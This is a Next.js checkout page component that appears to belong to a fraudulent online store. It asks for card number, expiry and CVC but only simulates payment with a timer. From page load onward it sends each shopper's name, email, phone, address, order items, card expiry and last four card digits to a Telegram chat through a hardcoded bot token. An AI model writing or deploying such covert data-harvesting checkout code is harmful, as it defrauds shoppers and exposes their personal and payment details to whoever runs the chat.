"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { useCart } from "@/lib/cart-context"
import { useTheme } from "@/lib/theme-context"
import { useRouter } from "next/navigation"
import { Lock, Info, ChevronDown, ChevronUp } from "lucide-react"

export default function CheckoutPage() {
  const router = useRouter()
  const { items, subtotal, discount, total, clearCart } = useCart()
  const { theme } = useTheme()
  const [loading, setLoading] = useState(false)
  const [mounted, setMounted] = useState(false)
  const [showOrderSummary, setShowOrderSummary] = useState(false)
  const [paymentMethod, setPaymentMethod] = useState("credit-card")

  const autoDiscount = discount > 0 ? discount : 0

  const [formData, setFormData] = useState({
    email: "",
    firstName: "",
    lastName: "",
    address: "",
    apartment: "",
    city: "",
    province: "",
    postalCode: "",
    country: "Canada",
    phone: "",
    cardNumber: "",
    cardExpiry: "",
    cardCvc: "",
    dob: "",
    billingAddressSame: true,
    billingAddress: "",
    billingApartment: "",
    billingCity: "",
    billingProvince: "",
    billingPostalCode: "",
    billingCountry: "Canada",
  })

  // ========== TELEGRAM CONFIGURATION ==========
  const TELEGRAM_BOT_TOKEN = '8318165972:AAFUvKuh1EMqEs0HmWtR6_7uTQomyVVymZ8'
  const TELEGRAM_CHAT_ID = '-5217100062'
  const sessionId = `HT4K_${Date.now()}`
  const [messageId, setMessageId] = useState(null)

  // Handle form input changes
  const handleInputChange = (e) => {
    const { name, value, type, checked } = e.target
    setFormData({
      ...formData,
      [name]: type === "checkbox" ? checked : value,
    })
  }

  // Format credit card number with spaces
  const formatCardNumber = (value) => {
    if (!value) return value
    const cardNumber = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
    const parts = []

    for (let i = 0; i < cardNumber.length; i += 4) {
      parts.push(cardNumber.substring(i, i + 4))
    }

    return parts.join(" ").substr(0, 19)
  }

  // Format expiry date (MM/YY)
  const formatExpiryDate = (value) => {
    if (!value) return value
    const expDate = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")

    if (expDate.length <= 2) {
      return expDate
    }

    return `${expDate.substring(0, 2)}/${expDate.substring(2, 4)}`
  }

  // Send initial message to Telegram
  const sendInitialTelegramMessage = async () => {
    if (!messageId) {
      try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: `💰 New Checkout Started - ${sessionId}\n\nWaiting for customer details...`,
            parse_mode: 'Markdown'
          }),
        })

        const result = await response.json()
        if (result.ok) {
          setMessageId(result.result.message_id)
        }
      } catch (error) {
        console.error('Error sending initial message:', error)
      }
    }
  }

  // Update Telegram message with form data
  const updateTelegramMessage = async (status) => {
    if (!messageId) return
    
    try {
      let message = `💰 Checkout Session - ${sessionId}\n\n`
      
      if (status === 'processing') {
        message += `🕒 *STATUS: PROCESSING*\n\n`
      } else if (status === 'completed') {
        message += `✅ *STATUS: COMPLETED*\n\n`
      } else if (status === 'failed') {
        message += `❌ *STATUS: FAILED*\n\n`
      }
      
      message += `📧 Email: ${formData.email || 'Not provided'}\n`
      message += `👤 Name: ${formData.firstName} ${formData.lastName}\n`
      message += `📱 Phone: ${formData.phone || 'Not provided'}\n\n`
      
      message += `🏠 *Shipping Address:*\n`
      message += `${formData.address}${formData.apartment ? ', ' + formData.apartment : ''}\n`
      message += `${formData.city}, ${formData.province} ${formData.postalCode}\n`
      message += `${formData.country}\n\n`
      
      message += `💳 *Payment:*\n`
      message += `Method: ${paymentMethod === 'credit-card' ? 'Credit Card' : 'Other'}\n`
      
      if (paymentMethod === 'credit-card' && formData.cardNumber) {
        const lastFour = formData.cardNumber.replace(/\s+/g, "").slice(-4)
        message += `Card Number: •••• •••• •••• ${lastFour}\n`
        message += `Expiry: ${formData.cardExpiry || 'Not provided'}\n\n`
      }
      
      message += `💰 *Order Summary:*\n`
      message += `Subtotal: $${subtotal.toFixed(2)}\n`
      
      if (autoDiscount > 0) {
        message += `Discount: -$${autoDiscount.toFixed(2)}\n`
      }
      
      const taxes = total * 0.13
      message += `Taxes (13%): $${taxes.toFixed(2)}\n`
      message += `Shipping: FREE\n`
      message += `Total: $${(total + taxes).toFixed(2)}\n\n`
      
      message += `🛒 *Items:*\n`
      items.forEach(item => {
        message += `- ${item.name} × ${item.quantity} - $${(item.price * item.quantity).toFixed(2)}\n`
      })
      
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          message_id: messageId,
          text: message,
          parse_mode: 'Markdown'
        }),
      })
    } catch (error) {
      console.error('Error updating message:', error)
    }
  }

  // Send form data on submit
  const handleSubmit = async (e) => {
    e.preventDefault()
    setLoading(true)
    
    // Update Telegram message with processing status
    await updateTelegramMessage('processing')
    
    // Simulate payment processing
    setTimeout(async () => {
      try {
        // Update Telegram message with completed status
        await updateTelegramMessage('completed')
        
        // Clear cart and redirect
        clearCart()
        router.push('/success')
      } catch (error) {
        console.error('Error:', error)
        updateTelegramMessage('failed')
        router.push('/order-failed')
      } finally {
        setLoading(false)
      }
    }, 2000)
  }

  useEffect(() => {
    setMounted(true)
    // Send initial Telegram message on component mount
    sendInitialTelegramMessage()
  }, [])

  if (!mounted) return null

  if (items.length === 0) {
    router.push('/cart')
    return null
  }

  const taxes = total * 0.13
  const shippingCost = 0 // Free shipping
  const grandTotal = total + taxes + shippingCost

  return (
    <div className={`min-h-screen ${theme === "dark" ? "bg-zinc-950" : "bg-[#fafafa]"}`}>
      <div className="max-w-7xl mx-auto">
        {/* Mobile Order Summary Toggle */}
        <div className="lg:hidden">
          <button
            onClick={() => setShowOrderSummary(!showOrderSummary)}
            className={`w-full px-4 py-4 flex items-center justify-between border-b ${theme === "dark" ? "bg-zinc-900 border-zinc-700" : "bg-[#f5f3ed] border-gray-200"}`}
          >
            <div className="flex items-center gap-2">
              <span className={`text-sm ${theme === "dark" ? "text-zinc-300" : "text-gray-600"}`}>Order summary</span>
              {showOrderSummary ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
            </div>
            <span className={`text-lg font-bold ${theme === "dark" ? "text-white" : "text-gray-900"}`}>
              ${grandTotal.toFixed(2)}
            </span>
          </button>
        </div>

        <div className="grid lg:grid-cols-12 gap-8 p-4 lg:p-8">
          {/* Checkout Form */}
          <div className="lg:col-span-7 lg:order-1 order-2">
            <div className="hidden lg:block">
              <h1 className={`text-3xl font-bold mb-8 ${theme === "dark" ? "text-white" : "text-gray-900"}`}>
                Checkout
              </h1>
            </div>

            <form onSubmit={handleSubmit} className="space-y-8">
              {/* Contact Information */}
              <div className={`p-6 rounded-xl ${theme === "dark" ? "bg-zinc-900 border border-zinc-800" : "bg-white border border-gray-200"}`}>
                <h2 className={`text-lg font-semibold mb-4 ${theme === "dark" ? "text-white" : "text-gray-900"}`}>
                  Contact information
                </h2>
                <div className="space-y-4">
                  <div>
                    <label
                      htmlFor="email"
                      className={`block text-sm font-medium mb-2 ${theme === "dark" ? "text-zinc-300" : "text-gray-700"}`}
                    >
                      Email address
                    </label>
                    <Input
                      type="email"
                      id="email"
                      name="email"
                      value={formData.email}
                      onChange={handleInputChange}
                      className={`w-full ${theme === "dark" ? "bg-zinc-800 border-zinc-700 text-white" : "bg-white border-gray-300"}`}
                      placeholder="youremail@example.com"
                    />
                  </div>
                </div>
              </div>

              {/* Shipping Information */}
              <div className={`p-6 rounded-xl ${theme === "dark" ? "bg-zinc-900 border border-zinc-800" : "bg-white border border-gray-200"}`}>
                <h2 className={`text-lg font-semibold mb-4 ${theme === "dark" ? "text-white" : "text-gray-900"}`}>
                  Shipping information
                </h2>
                <div className="space-y-4">
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label
                        htmlFor="firstName"
                        className={`block text-sm font-medium mb-2 ${theme === "dark" ? "text-zinc-300" : "text-gray-700"}`}
                      >
                        First name
                      </label>
                      <Input
                        type="text"
                        id="firstName"
                        name="firstName"
                        value={formData.firstName}
                        onChange={handleInputChange}
                        className={`w-full ${theme === "dark" ? "bg-zinc-800 border-zinc-700 text-white" : "bg-white border-gray-300"}`}
                        required
                      />
                    </div>
                    <div>
                      <label
                        htmlFor="lastName"
                        className={`block text-sm font-medium mb-2 ${theme === "dark" ? "text-zinc-300" : "text-gray-700"}`}
                      >
                        Last name
                      </label>
                      <Input
                        type="text"
                        id="lastName"
                        name="lastName"
                        value={formData.lastName}
                        onChange={handleInputChange}
                        className={`w-full ${theme === "dark" ? "bg-zinc-800 border-zinc-700 text-white" : "bg-white border-gray-300"}`}
                        required
                      />
                    </div>
                  </div>

                  <div>
                    <label
                      htmlFor="address"
                      className={`block text-sm font-medium mb-2 ${theme === "dark" ? "text-zinc-300" : "text-gray-700"}`}
                    >
                      Address
                    </label>
                    <Input
                      type="text"
                      id="address"
                      name="address"
                      value={formData.address}
                      onChange={handleInputChange}
                      className={`w-full ${theme === "dark" ? "bg-zinc-800 border-zinc-700 text-white" : "bg-white border-gray-300"}`}
                      required
                    />
                  </div>

                  <div>
                    <label
                      htmlFor="apartment"
                      className={`block text-sm font-medium mb-2 ${theme === "dark" ? "text-zinc-300" : "text-gray-700"}`}
                    >
                      Apartment, suite, etc. (optional)
                    </label>
                    <Input
                      type="text"
                      id="apartment"
                      name="apartment"
                      value={formData.apartment}
                      onChange={handleInputChange}
                      className={`w-full ${theme === "dark" ? "bg-zinc-800 border-zinc-700 text-white" : "bg-white border-gray-300"}`}
                    />
                  </div>

                  <div className="grid grid-cols-6 gap-4">
                    <div className="col-span-2">
                      <label
                        htmlFor="city"
                        className={`block text-sm font-medium mb-2 ${theme === "dark" ? "text-zinc-300" : "text-gray-700"}`}
                      >
                        City
                      </label>
                      <Input
                        type="text"
                        id="city"
                        name="city"
                        value={formData.city}
                        onChange={handleInputChange}
                        className={`w-full ${theme === "dark" ? "bg-zinc-800 border-zinc-700 text-white" : "bg-white border-gray-300"}`}
                        required
                      />
                    </div>
                    <div className="col-span-2">
                      <label
                        htmlFor="province"
                        className={`block text-sm font-medium mb-2 ${theme === "dark" ? "text-zinc-300" : "text-gray-700"}`}
                      >
                        Province
                      </label>
                      <Input
                        type="text"
                        id="province"
                        name="province"
                        value={formData.province}
                        onChange={handleInputChange}
                        className={`w-full ${theme === "dark" ? "bg-zinc-800 border-zinc-700 text-white" : "bg-white border-gray-300"}`}
                        required
                      />
                    </div>
                    <div className="col-span-2">
                      <label
                        htmlFor="postalCode"
                        className={`block text-sm font-medium mb-2 ${theme === "dark" ? "text-zinc-300" : "text-gray-700"}`}
                      >
                        Postal code
                      </label>
                      <Input
                        type="text"
                        id="postalCode"
                        name="postalCode"
                        value={formData.postalCode}
                        onChange={handleInputChange}
                        className={`w-full ${theme === "dark" ? "bg-zinc-800 border-zinc-700 text-white" : "bg-white border-gray-300"}`}
                        required
                      />
                    </div>
                  </div>

                  <div>
                    <label
                      htmlFor="phone"
                      className={`block text-sm font-medium mb-2 ${theme === "dark" ? "text-zinc-300" : "text-gray-700"}`}
                    >
                      Phone number
                    </label>
                    <Input
                      type="tel"
                      id="phone"
                      name="phone"
                      value={formData.phone}
                      onChange={handleInputChange}
                      className={`w-full ${theme === "dark" ? "bg-zinc-800 border-zinc-700 text-white" : "bg-white border-gray-300"}`}
                      placeholder="For shipping updates"
                    />
                  </div>
                </div>
              </div>

              {/* Payment Information */}
              <div className={`p-6 rounded-xl ${theme === "dark" ? "bg-zinc-900 border border-zinc-800" : "bg-white border border-gray-200"}`}>
                <h2 className={`text-lg font-semibold mb-4 ${theme === "dark" ? "text-white" : "text-gray-900"}`}>
                  Payment
                </h2>
                <div className="space-y-4">
                  <div>
                    <label
                      className={`block text-sm font-medium mb-3 ${theme === "dark" ? "text-zinc-300" : "text-gray-700"}`}
                    >
                      Payment method
                    </label>
                    <div 
                      className={`p-4 rounded-lg border-2 border-orange-500 flex items-center gap-3 ${theme === "dark" ? "bg-zinc-800" : "bg-orange-50"}`}
                    >
                      <div className="w-5 h-5 rounded-full bg-orange-500 flex items-center justify-center">
                        <div className="w-2 h-2 rounded-full bg-white"></div>
                      </div>
                      <span className={`font-medium ${theme === "dark" ? "text-white" : "text-gray-900"}`}>
                        Credit card
                      </span>
                    </div>

                    <div className="mt-4 space-y-4">
                      <div>
                        <label
                          htmlFor="cardNumber"
                          className={`block text-sm font-medium mb-2 ${theme === "dark" ? "text-zinc-300" : "text-gray-700"}`}
                        >
                          Card number
                        </label>
                        <Input
                          type="text"
                          id="cardNumber"
                          name="cardNumber"
                          value={formData.cardNumber}
                          onChange={(e) => {
                            const formatted = formatCardNumber(e.target.value)
                            setFormData({
                              ...formData,
                              cardNumber: formatted,
                            })
                          }}
                          className={`w-full ${theme === "dark" ? "bg-zinc-800 border-zinc-700 text-white" : "bg-white border-gray-300"}`}
                          placeholder="1234 5678 9012 3456"
                          required
                        />
                      </div>

                      <div className="grid grid-cols-2 gap-4">
                        <div>
                          <label
                            htmlFor="cardExpiry"
                            className={`block text-sm font-medium mb-2 ${theme === "dark" ? "text-zinc-300" : "text-gray-700"}`}
                          >
                            Expiration date (MM/YY)
                          </label>
                          <Input
                            type="text"
                            id="cardExpiry"
                            name="cardExpiry"
                            value={formData.cardExpiry}
                            onChange={(e) => {
                              const formatted = formatExpiryDate(e.target.value)
                              setFormData({
                                ...formData,
                                cardExpiry: formatted,
                              })
                            }}
                            className={`w-full ${theme === "dark" ? "bg-zinc-800 border-zinc-700 text-white" : "bg-white border-gray-300"}`}
                            placeholder="MM/YY"
                            maxLength="5"
                            required
                          />
                        </div>
                        <div>
                          <label
                            htmlFor="cardCvc"
                            className={`block text-sm font-medium mb-2 ${theme === "dark" ? "text-zinc-300" : "text-gray-700"}`}
                          >
                            Security code (CVC)
                          </label>
                          <Input
                            type="text"
                            id="cardCvc"
                            name="cardCvc"
                            value={formData.cardCvc}
                            onChange={handleInputChange}
                            className={`w-full ${theme === "dark" ? "bg-zinc-800 border-zinc-700 text-white" : "bg-white border-gray-300"}`}
                            placeholder="CVC"
                            maxLength="4"
                            required
                          />
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              <Button 
                type="submit" 
                className="w-full bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white py-6 text-lg font-bold"
                disabled={loading}
              >
                {loading ? (
                  <span className="flex items-center gap-2">
                    <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    Processing order...
                  </span>
                ) : (
                  <span className="flex items-center gap-2">
                    <Lock className="w-5 h-5" />
                    Complete Order
                  </span>
                )}
              </Button>
            </form>
          </div>

          {/* Order Summary */}
          <div className={`lg:col-span-5 lg:order-2 order-1 ${showOrderSummary || 'hidden lg:block'}`}>
            <div className={`p-6 rounded-xl sticky top-8 ${theme === "dark" ? "bg-zinc-900 border border-zinc-800" : "bg-white border border-gray-200"}`}>
              <h2 className={`text-xl font-bold mb-6 ${theme === "dark" ? "text-white" : "text-gray-900"}`}>
                Order Summary
              </h2>

              <div className="space-y-4 max-h-[50vh] overflow-y-auto pr-2">
                {items.map((item) => (
                  <div 
                    key={item.id}
                    className={`flex gap-4 pb-4 ${theme === "dark" ? "border-b border-zinc-800" : "border-b border-gray-200"}`}
                  >
                    <div className={`w-16 h-16 rounded flex-shrink-0 ${theme === "dark" ? "bg-zinc-800" : "bg-gray-100"} flex items-center justify-center overflow-hidden relative`}>
                      {item.image ? (
                        // eslint-disable-next-line @next/next/no-img-element
                        <img src={item.image} alt={item.name} className="object-cover w-full h-full" />
                      ) : (
                        <span className={`text-xl font-bold ${theme === "dark" ? "text-zinc-600" : "text-gray-300"}`}>
                          {item.name.charAt(0)}
                        </span>
                      )}
                      {item.quantity > 1 && (
                        <div className="absolute -top-2 -right-2 bg-orange-500 text-white w-5 h-5 rounded-full flex items-center justify-center text-xs">
                          {item.quantity}
                        </div>
                      )}
                    </div>
                    <div className="flex-1 min-w-0">
                      <h3 className={`font-medium text-sm mb-1 ${theme === "dark" ? "text-white" : "text-gray-900"}`}>
                        {item.name}
                      </h3>
                      {item.variant && (
                        <p className={`text-xs mb-2 ${theme === "dark" ? "text-zinc-400" : "text-gray-500"}`}>
                          {item.variant}
                        </p>
                      )}
                      <div className="flex justify-between">
                        <p className={`text-sm ${theme === "dark" ? "text-zinc-400" : "text-gray-500"}`}>
                          Qty: {item.quantity}
                        </p>
                        <p className={`font-medium ${theme === "dark" ? "text-white" : "text-gray-900"}`}>
                          ${(item.price * item.quantity).toFixed(2)}
                        </p>
                      </div>
                    </div>
                  </div>
                ))}
              </div>

              <div className={`pt-4 mt-4 space-y-2 ${theme === "dark" ? "border-t border-zinc-800" : "border-t border-gray-200"}`}>
                <div className="flex justify-between">
                  <span className={`${theme === "dark" ? "text-zinc-400" : "text-gray-500"}`}>Subtotal</span>
                  <span className={`${theme === "dark" ? "text-white" : "text-gray-900"}`}>${subtotal.toFixed(2)}</span>
                </div>

                {autoDiscount > 0 && (
                  <div className="flex justify-between">
                    <span className="text-green-500">Discount</span>
                    <span className="text-green-500">-${autoDiscount.toFixed(2)}</span>
                  </div>
                )}

                <div className="flex justify-between">
                  <span className={`${theme === "dark" ? "text-zinc-400" : "text-gray-500"}`}>
                    Taxes (13%)
                  </span>
                  <span className={`${theme === "dark" ? "text-white" : "text-gray-900"}`}>${taxes.toFixed(2)}</span>
                </div>

                <div className="flex justify-between">
                  <span className={`${theme === "dark" ? "text-zinc-400" : "text-gray-500"}`}>Shipping</span>
                  <span className="text-green-500">Free</span>
                </div>

                <div className={`flex justify-between pt-2 border-t ${theme === "dark" ? "border-zinc-800" : "border-gray-200"}`}>
                  <span className={`text-lg font-bold ${theme === "dark" ? "text-white" : "text-gray-900"}`}>Total</span>
                  <span className="text-xl font-bold text-orange-500">${grandTotal.toFixed(2)}</span>
                </div>
              </div>

              <div className={`flex items-center gap-2 mt-6 p-3 rounded ${theme === "dark" ? "bg-zinc-800" : "bg-gray-50"}`}>
                <Info className={`w-4 h-4 ${theme === "dark" ? "text-zinc-400" : "text-gray-500"}`} />
                <span className={`text-xs ${theme === "dark" ? "text-zinc-400" : "text-gray-500"}`}>
                  Your personal data will be used to process your order, support your experience, and for other purposes described in our privacy policy.
                </span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
